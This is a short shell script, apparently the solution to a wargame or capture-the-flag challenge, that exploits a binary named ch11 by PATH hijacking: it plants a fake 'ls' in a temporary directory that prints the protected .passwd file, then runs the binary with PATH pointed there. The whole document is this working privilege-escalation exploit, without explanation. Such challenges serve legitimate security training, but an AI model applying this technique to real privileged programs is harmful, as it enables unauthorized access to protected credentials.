# ssh ... < commands.sh

d=$(mktemp -d)
chmod g+x $d

cat << EOF > $d/ls
#!/bin/bash
/bin/cat .passwd
EOF
chmod +x $d/ls

PATH=$d ./ch11